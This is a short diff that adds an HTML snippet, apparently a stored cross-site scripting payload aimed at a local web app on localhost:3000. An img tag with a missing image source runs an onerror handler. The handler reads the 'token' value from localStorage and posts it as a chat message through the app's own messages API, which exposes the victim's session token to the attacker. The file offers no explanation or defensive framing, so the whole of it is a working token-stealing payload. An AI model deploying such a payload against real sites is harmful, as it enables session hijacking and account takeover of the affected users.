@@ -1,0 +1,16 @@
+<img src="http://localhost:3000/non-existent-image.jpg" onerror="
+    let token = localStorage.getItem('token');
+    if (token) {
+        // Post a new message containing the token
+        fetch('http://localhost:3000/api/messages', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${token}`
+            },
+            body: JSON.stringify({
+                content: 'TOKEN: ' + token
+            })
+        });
+    }
+">
